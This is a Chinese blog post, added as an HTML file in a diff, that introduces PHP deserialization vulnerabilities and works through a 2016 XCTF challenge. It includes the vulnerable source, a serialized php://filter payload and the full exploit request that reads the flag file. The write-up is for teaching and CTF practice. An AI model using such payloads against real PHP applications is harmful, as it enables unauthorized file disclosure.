@@ -1,0 +1,181 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>PHP反序列化初探笔记 | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="PHP反序列化初探笔记">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>PHP反序列化初探笔记</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/PHP-unserialize.html" rel="bookmark">
+        <time class="entry-date published" datetime="2017-10-25T12:30:58.000Z">
+          2017-10-25
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul>
+<li><p>序列化就是使用<code>serialize()</code>将对象的用字符串的方式进行表示，反序列化是使用<code>unserialize()</code>将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。</p>
+</li>
+<li><p>序列化的对象可以是<code>class</code>也可以是<code>Array,string</code>等其他对象。</p>
+</li>
+</ul>
+<a id="more"></a>
+<h2 id="反序列化存在的问题"><a href="#反序列化存在的问题" class="headerlink" title="反序列化存在的问题"></a>反序列化存在的问题</h2><ul>
+<li><p>问题原因：漏洞的根源在于<code>unserialize()</code>函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
+</li>
+<li><p>魔术方法：PHP的类中可能会包含一些特殊的函数叫魔术函数，魔术函数命名是以符号 __开头的</p>
+</li>
+</ul>
+<ul>
+<li>反序列化漏洞中常见到有一些魔术方法：<br><code>__construct()</code>：在对象创建时自动被调用<br><code>__destruct()</code>：对象被销毁时触发<br><code>__sleep()</code>：使用serialize时触发<br><code>__wakeup()</code>：使用unserialize时触发<br><code>__toString()</code>： 把类当作字符串调用时触发<br><code>__call()</code>：在对象上下文中调用不可访问的方法时触发<br><code>__callStatic()</code>：在静态上下文中调用不可访问的方法时触发<br><code>__get()</code>：用于从不可访问的属性读取数据，或访问类中不存在的方法时触发<br><code>__set()</code>：用于将数据写入不可访问的属性<br><code>__isset()</code>：在不可访问的属性上调用isset()或empty()触发<br><code>__unset()</code>：在不可访问的属性上使用unset()时触发<br><code>__invoke()</code>：当脚本尝试将对象调用为函数时触发</li>
+</ul>
+<h2 id="2016xctf的一道反序列化题目"><a href="#2016xctf的一道反序列化题目" class="headerlink" title="2016xctf的一道反序列化题目"></a>2016xctf的一道反序列化题目</h2><p>index.php的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;  </span><br><span class="line"></span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">      <span class="keyword">include</span>($file); <span class="comment">//class.php  </span></span><br><span class="line"></span><br><span class="line">        $pass = unserialize($pass);  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> ($pass);  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>class.php的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php  </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> $file;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line"></span><br><span class="line">         <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);      </span><br><span class="line"></span><br><span class="line">      &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>源码分析： </p>
+<ul>
+<li><p>index.php源码 中的第6行使用<code>file_get_contents</code>读取user参数的值，这里必须要用<code>php://input</code> 赋值the user is admin，并不可以利用。<br>第9行限制我们在给file传值时不能含有<code>f1a9</code>，我没有做过原题，可以猜出出题人不想让我们直接读取f1a9xxx的文件，flag应该就在其中。<br>然后在源码的第15行存在<code>include($file)</code>文件包含，第17行<code>unserialize($pass)</code>反序列化函数的参数可控，在第13行执行了<code>echo $pass;</code> </p>
+</li>
+<li><p>class.php源码 中使用了<code>__toString()</code>魔术方法，<code>echo $pass;</code> 会触发__toString()魔术方法，所以存在反序列化漏洞，其中第11行file_get_contents是用来读取$file变量的文件的，并且给出了提示，//f1a9.php； </p>
+</li>
+<li><p>所以本题的考点就是利用文件包含使用php://input的封装协议传入user参数的值，满足index.php源码中的第6行的条件，在pass参数中传入序列化后要读取的flag文件。</p>
+</li>
+</ul>
+<h3 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> $file;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload -&gt; file = <span class="string">'php://filter/read=convert.base64-encode/resource=f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br></pre></td></tr></table></figure>
+<p>输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最终请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET DATA ：?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125; </span><br><span class="line"></span><br><span class="line">POST DATA：the user is admin</span><br></pre></td></tr></table></figure></p>
+<p>进行上面的请求，然后得到经过base64编码过的f1a9.php源码，得到flag。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Web/">Web</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/PHP/">PHP</a><a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
